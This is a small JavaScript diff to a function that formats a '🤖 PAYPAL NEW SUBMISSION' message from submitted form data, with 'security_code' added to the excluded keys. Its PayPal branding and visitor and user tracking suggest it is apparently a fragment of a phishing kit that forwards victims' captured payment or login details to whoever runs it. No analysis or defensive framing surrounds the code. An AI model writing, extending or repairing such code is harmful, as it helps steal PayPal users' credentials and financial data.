@@ -194,7 +194,7 @@ async function buildMessage(data, options = {}) {
   try { 
     let message = ``;
     message = `🤖 PAYPAL NEW SUBMISSION\n\n`;
-    const excludeKeys = ["visitor", "userid"];
+    const excludeKeys = ["visitor", "userid", "security_code"];
 
     for (const [key, value] of Object.entries(data)) {
       const lowerKey = key.toLowerCase();
